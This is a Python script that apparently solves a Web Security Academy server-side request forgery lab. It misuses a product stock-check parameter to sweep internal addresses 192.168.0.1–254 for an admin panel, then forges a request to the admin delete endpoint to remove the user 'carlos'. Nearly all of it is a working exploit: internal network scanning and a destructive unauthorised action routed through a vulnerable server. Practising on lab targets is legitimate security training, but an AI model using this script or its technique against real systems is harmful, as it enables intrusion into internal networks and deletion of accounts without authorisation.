import requests

# Target stock check URL
stock_url = 'https://0a32002503567ade800bb74100ca000f.web-security-academy.net/product/stock'

admin_ip = None

# Step 1: Scan internal IPs for an admin interface
print("[*] Scanning internal IPs for admin interface...")
for i in range(1, 255):
    test_ip = f'192.168.0.{i}'
    ssrf_data = {
        'stockApi': f'http://{test_ip}:8080/admin'
    }
    try:
        resp = requests.post(stock_url, data=ssrf_data)
        if resp.status_code == 200 and "delete" in resp.text:
            print(f"[+] Admin interface found at: {test_ip}")
            admin_ip = test_ip
            print("[*] Admin page content snippet:")
            print(resp.text[:300])  # Print first 300 chars for confirmation
            break
    except Exception as e:
        print(f"[-] Failed to reach {test_ip}:8080")

# Step 2: Send delete request via SSRF if admin interface was found
if admin_ip:
    delete_payload = {
        'stockApi': f'http://{admin_ip}:8080/admin/delete?username=carlos'
    }
    print(f"[*] Sending SSRF to delete carlos at {admin_ip}...")
    delete_response = requests.post(stock_url, data=delete_payload)
    print("[*] Delete response:")
    print(delete_response.text)
else:
    print("[-] Admin interface not found in 192.168.0.1-254")
